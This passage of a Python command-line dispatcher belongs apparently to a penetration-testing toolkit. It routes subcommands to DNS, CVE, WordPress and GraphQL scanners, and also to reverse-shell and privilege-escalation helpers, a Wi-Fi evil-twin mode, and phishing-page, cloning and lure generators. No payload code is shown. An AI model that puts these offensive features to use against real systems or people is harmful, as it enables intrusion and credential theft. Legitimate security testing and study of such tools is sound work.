        elif cmd == "shell-list": shell_manager.cli_list()
        elif cmd == "shell-start":
            shell_manager.cli_start(host=args.host, port=args.port)
        elif cmd == "shell-stop": shell_manager.cli_stop()

        elif cmd == "dns-tools": dns_tools.menu()
        elif cmd == "dns-axfr": dns_tools.zone_transfer(args.domain)
        elif cmd == "dns-dnssec": dns_tools.dnssec_check(args.domain)
        elif cmd == "dns-wildcard": dns_tools.wildcard_detect(args.domain)
        elif cmd == "dns-ptr":
            dns_tools.reverse_scan(args.cidr, threads=args.threads)
        elif cmd == "dns-snoop":
            dns_tools.cache_snooping(args.domain, args.resolver)
        elif cmd == "dns-cname":
            dns_tools.show_cname_chain(args.domain)
        elif cmd == "dns-srv": dns_tools.srv_scan(args.domain)
        elif cmd == "dns-mail": dns_tools.mail_security(args.domain)
        elif cmd == "dns-rebinding": dns_tools.rebinding_detect(args.domain)

        elif cmd == "takeover": subdomain_takeover.menu()
        elif cmd == "takeover-scan":
            subdomain_takeover.cli_scan(args.domain,
                                        wordlist=args.wordlist,
                                        threads=args.threads)
        elif cmd == "takeover-check":
            subdomain_takeover.cli_check(args.subdomain)
        elif cmd == "takeover-batch":
            subdomain_takeover.cli_batch(args.source, threads=args.threads)
        elif cmd == "takeover-services":
            subdomain_takeover.cli_services()

        elif cmd == "cve": cve_feeds.menu()
        elif cmd == "cve-download":
            cve_feeds.cli_download(keyword=args.keyword, days=args.days,
                                   max_results=args.max_results)
        elif cmd == "cve-search":
            cve_feeds.cli_search(args.keyword, min_score=args.min_score,
                                 only_kev=args.kev, limit=args.limit)
        elif cmd == "cve-top":
            cve_feeds.cli_top(days=args.days, min_score=args.min_score,
                              limit=args.limit)
        elif cmd == "cve-kev":
            cve_feeds.cli_kev(limit=args.limit)
        elif cmd == "cve-kev-update":
            cve_feeds.download_kev()
        elif cmd == "cve-show":
            cve_feeds.cli_show(args.cve_id)
        elif cmd == "cve-dorks":
            cve_feeds.cli_dorks(args.product,
                                version=args.version,
                                cve_id=args.cve_id)
        elif cmd == "cve-stats":
            cve_feeds.stats()

        elif cmd == "wifi": wireless_toolkit.menu()
        elif cmd == "wifi-scan": wireless_toolkit.cli_scan()
        elif cmd == "wifi-evil": wireless_toolkit.cli_evil_twin()
        elif cmd == "wifi-open": wireless_toolkit.cli_open()
        elif cmd == "wifi-weak": wireless_toolkit.cli_weak()
        elif cmd == "wifi-channels": wireless_toolkit.cli_channels()
        elif cmd == "wifi-top": wireless_toolkit.cli_top()
        elif cmd == "wifi-export-csv": wireless_toolkit.cli_export_csv()
        elif cmd == "wifi-export-json": wireless_toolkit.cli_export_json()
        elif cmd == "wifi-full": wireless_toolkit.cli_full()

        elif cmd == "wp": wordpress_scanner.menu()
        elif cmd == "wp-scan":
            wordpress_scanner.cli_scan(args.url,
                                       aggressive=args.aggressive)
        elif cmd == "wp-detect": wordpress_scanner.cli_detect(args.url)
        elif cmd == "wp-users": wordpress_scanner.cli_users(args.url)
        elif cmd == "wp-plugins": wordpress_scanner.cli_plugins(args.url)
        elif cmd == "wp-xmlrpc": wordpress_scanner.cli_xmlrpc(args.url)
        elif cmd == "wp-vulns": wordpress_scanner.cli_vulns(args.url)

        elif cmd == "gql": graphql_discovery.menu()
        elif cmd == "gql-scan": graphql_discovery.cli_full(args.url)
        elif cmd == "gql-discover": graphql_discovery.cli_gql(args.url)
        elif cmd == "gql-introspect":
            graphql_discovery.cli_gql_introspect(args.endpoint)
        elif cmd == "api-swagger": graphql_discovery.cli_swagger(args.url)
        elif cmd == "api-rest": graphql_discovery.cli_rest(args.url)
        elif cmd == "api-js": graphql_discovery.cli_js(args.url)

        # ---- Pivot Helpers ----
        elif cmd == "pivot": pivot_helper.menu()
        elif cmd == "pivot-reverse":
            pivot_helper.cli_reverse_shells(args.lhost, args.lport)
        elif cmd == "pivot-bind":
            pivot_helper.cli_bind_shells(args.lport)
        elif cmd == "pivot-tty":
            pivot_helper.cli_tty_upgrade(args.lhost, args.lport)
        elif cmd == "pivot-transfer":
            pivot_helper.cli_file_transfer(args.lhost, args.target_ip)
        elif cmd == "pivot-tunnel":
            pivot_helper.cli_pivot(args.lhost, args.lport, args.target_ip)
        elif cmd == "pivot-linux":
            pivot_helper.cli_linux_privesc(args.target_ip)
        elif cmd == "pivot-windows":
            pivot_helper.cli_windows_privesc(args.lhost)
        elif cmd == "pivot-encode":
            pivot_helper.cli_payload_encoding()

        # ---- Social Engineering (CTF) ----
        elif cmd == "se": social_engineer.menu()
        elif cmd == "se-templates": social_engineer.cli_templates()
        elif cmd == "se-phish":
            social_engineer.cli_generate(args.template, args.out)
        elif cmd == "se-server":
            social_engineer.cli_server(
                port=args.port, template=args.template,
                redirect=args.redirect,
            )
        elif cmd == "se-qr": social_engineer.cli_qr(args.data, args.out)
        elif cmd == "se-email":
            social_engineer.cli_email(
                args.template, link=args.link,
                name=args.name, out=args.out,
            )
        elif cmd == "se-sms":
            social_engineer.cli_sms(args.template, link=args.link)
        elif cmd == "se-clone":
            social_engineer.cli_clone(args.url, args.out)
        elif cmd == "se-obfuscate":
            social_engineer.cli_obfuscate(args.url)
        elif cmd == "se-pixel":
            social_engineer.cli_pixel(args.server, args.out)

        # ---- Threat Intelligence ----
        elif cmd == "ti": threat_intel.menu()
        elif cmd == "ti-ip": threat_intel.cli_ip(args.ip)
        elif cmd == "ti-domain": threat_intel.cli_domain(args.domain)
        elif cmd == "ti-hash": threat_intel.cli_hash(args.hash)
        elif cmd == "ti-url": threat_intel.cli_url(args.url)
        elif cmd == "ti-auto": threat_intel.cli_auto(args.ioc)
        elif cmd == "ti-bulk":
            threat_intel.cli_bulk(args.source, threads=args.threads)
        elif cmd == "ti-sources": threat_intel.cli_sources()

        # ---- Bug Bounty Auto-Scan ----
        elif cmd == "autoscan": bugbounty_autoscan.menu()
        elif cmd == "autoscan-run":
            bugbounty_autoscan.cli_scan(
                args.domain, profile=args.profile,
                out_dir=args.out, skip=args.skip,
            )
        elif cmd == "autoscan-profiles": bugbounty_autoscan.cli_profiles()
        elif cmd == "autoscan-past": bugbounty_autoscan.cli_past()

        # ---- Report Templates Pack ----
        elif cmd == "report-pack": report_pack.menu()
        elif cmd == "rp-new":
            report_pack.cli_wizard(platform=args.platform)
        elif cmd == "rp-preset":
            report_pack.cli_from_preset(args.platform, args.preset)
        elif cmd == "rp-from-finding":
            report_pack.cli_from_finding(
                args.finding_id, platform=args.platform, preset=args.preset,
            )
        elif cmd == "rp-bulk":
            report_pack.cli_bulk(target=args.target, platform=args.platform)
        elif cmd == "rp-platforms": report_pack.cli_platforms()
        elif cmd == "rp-presets": report_pack.cli_presets()
        elif cmd == "rp-cvss": report_pack.cli_cvss(args.vector)
        elif cmd == "rp-list": report_pack.cli_list()

        elif cmd == "scheduler-list": scheduler.list_jobs()
        elif cmd == "scheduler-run": scheduler.run_forever()
        elif cmd == "notify-status": notifier.status()
        elif cmd == "notify-test": notifier.test_all()
        elif cmd == "bot": telegram_bot.run_bot_forever()
        elif cmd == "bot-info": telegram_bot.info()
        elif cmd == "stego-pro": stego_pro.menu()
        elif cmd == "stego-chi-png":
            from pathlib import Path as _P
            console.print(stego_pro.chi_square_png(_P(args.path)))
        elif cmd == "stego-chi-wav":
            from pathlib import Path as _P
            console.print(stego_pro.chi_square_wav(_P(args.path)))
        elif cmd == "b64encode": print(utils_tools.b64_encode(args.text))
        elif cmd == "b64decode": print(utils_tools.b64_decode(args.text))
        elif cmd == "filehash": utils_tools.file_hashes(args.path)
        elif cmd == "revshell": _print_revshell(args.lhost, args.lport)
        else:
            return False
    except KeyboardInterrupt:
        console.print("\n[yellow]Прервано.[/yellow]")
        return True
    except Exception as exc:  # noqa: BLE001
        log.exception("CLI ошибка: %s", exc)
        console.print(f"[red]Ошибка: {exc}[/red]")
        return True
    return True


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if getattr(args, "tui", False) or args.cmd == "tui":
        from tui.app import run_tui
        run_tui()
        return

    if not args.no_banner:
        show_banner()

    if args.cmd:
        _dispatch_cli(args)
        return

    interactive()


if __name__ == "__main__":
    main()